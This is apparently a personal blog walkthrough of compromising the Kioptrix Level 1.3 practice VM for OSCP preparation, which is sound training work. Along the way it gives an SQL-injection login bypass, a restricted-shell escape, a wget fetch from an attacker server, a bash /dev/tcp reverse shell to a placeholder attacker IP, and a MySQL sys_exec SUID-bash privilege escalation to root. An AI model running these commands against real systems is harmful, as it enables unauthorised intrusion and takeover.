[Kioptrix]( https://www.vulnhub.com/entry/kioptrix-level-13-4,25) Level 1.3 is a vulnerable machine found on the [NetSecFocus Trophy Room](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0) list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.

First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used **netdiscover -i eth0** until I came across the IP of this machine.

Let's run **threader3000** to enumerate the open ports on this box.

Let's run the suggested nmap scan and see what results we get.

It appears that we have SSH, HTTP and SMB open. Let's connect with rpcclient by running **rpcclient -H [machine IP] -U "" ** to see if anonymous user access is allowed.

![Kioptrix Level 1.3 rpcclient anonymous](/assets/img/KioptrixLevel44.png)

Success! let's run **enumdomusers** to enumerate the users.

![Kioptrix Level 1.3 enumdomusers rpcclient](/assets/img/KioptrixLevel45.png)

I also ran **queryuser** on all the users above, but there was nothing listed in the comments that could be valuable. Next, I decided to take a look at the website.

![Kioptrix Level 1.3 website](/assets/img/KioptrixLevel46.png)

The website asks for login credentials. The two most likely methods of attack are either brute forcing credentials with something like hydra, or with SQL injection. I decided to try some basic SQL injection techniques in the password field first with the three users we uncovered (robert, john, loneferret). After some trial and error, I uncovered that utilizing **' OR 1 =1 -- -** in the password field worked and bypassed authentication for john and robert.

![Kioptrix Level 1.3 john credentials](/assets/img/KioptrixLevel47.png)

![Kioptrix Level 1.3 robert credentials](/assets/img/KioptrixLevel48.png)

We now had a username and password for **john** and **robert**. I tried to ssh as both of them and was able to get in (even though robert's looks like a base64 encoded password, it is not and works as shown above). For both john and robert, they login with a restricted shell as shown below. Running help shows a minimal amount of commands that can be run from this restricted shell.

Fortunately, we can use echo to our advantage and break out of the shell with **echo os.system('/bin/bash')**.

![Kioptrix Level 1.3 break out of restricted shell](/assets/img/KioptrixLevel410.png)

Success! We have broken out of the restricted shell. I ran **sudo -l** and neither john or robert could run sudo.

![Kioptrix Level 1.3 john sudo -l](/assets/img/KioptrixLevel411.png)

![Kioptrix Level 1.3 robert sudo -l](/assets/img/KioptrixLevel412.png)

Let's do some enumeration and see what we can find, first let's run **cd /tmp** to navigate to the tmp directory which is usually writeable by all.

![Kioptrix Level 1.3 cd /tmp](/assets/img/KioptrixLevel413.png)

Next, on my attacker pc, I hosted a python3 HTTP server from a directory where I had linpeas available.

![Kioptrix Level 1.3 python3 http server](/assets/img/KioptrixLevel414.png)

From the victim PC, run **wget http://[attacker ip]:8000/linpeas.sh** to save linpeas.sh to the /tmp directory. Next, run **chmod +x linpeas.sh** to make it executable

![Kioptrix Level 1.3 wget](/assets/img/KioptrixLevel415.png)

Next, I ran **./linpeas.sh** to enumerate the system. A couple of interesting things showed up related to mysql.

![Kioptrix Level 1.3 linpeas.sh](/assets/img/KioptrixLevel416.png)

It appears that mysql can be logged into as root without a password and you can execute system commands from it. Let's login to mysql with **mysql -U root -N**.

![Kioptrix Level 1.3 mysql root login](/assets/img/KioptrixLevel417.png)

I first ran **show databases;** and then ran **use members;** to select the members database followed by **show tables;** . Next, I ran **select * from members;** to enumerate the data in the table. This only provided us with the login credentials we already had for john and robert.

![Kioptrix Level 1.3 enumerate members database](/assets/img/KioptrixLevel418.png)

Next, I went back to what linpeas mentioned, which is that you can execute commands. The method mentioned did not work, so I did some research and came across [this article](https://recipeforroot.com/mysql-to-system-root/). It mentions **mysqludf_sys.so**, which is mentioned in the linpeas results above. Let's attempt the rest of the commands and see what happens. First, let's run **use mysql;** to select that database.

![Kioptrix Level 1.3 use mysql](/assets/img/KioptrixLevel419.png)

Next, on our attacker PC, let's run **nc -nvlp 4444**

![Kioptrix Level 1.3 nc reverse listener](/assets/img/KioptrixLevel420.png)

Next, let's **select sys_exec('bash -i >& /dev/tcp/[attacker ip]/4444 0>&1');**. Unfortunately, this did not work.

![Kioptrix Level 1.3 reverse shell failure](/assets/img/KioptrixLevel421.png)

Let's see if we can make the bash executable a SUID with **select sys_exec('chmod +s /bin/bash');**

![Kioptrix Level 1.3 chmod /bin/bash](/assets/img/KioptrixLevel422.png)

This appears to have worked, let's quit mysql and run **cd /bin** followed by **ls -al**. You will see that **bash** is now a SUID.

![Kioptrix Level 1.3](/assets/img/KioptrixLevel423.png)

Since this is an old version of bash, we can run **bash -p**, which runs it in privileged mode utilizing the SUID user, which is root.

![Kioptrix Level 1.3 root shell](/assets/img/KioptrixLevel424.png)

Next, let's navigate run **cd /root** and **ls -al** to list directory contents for the root user. There is a file named congrats.txt. Let's run **cat congrats.txt** to list the contents of this file.

![Kioptrix Level 1.3 congrats.txt](/assets/img/KioptrixLevel425.png)

And we're all set!
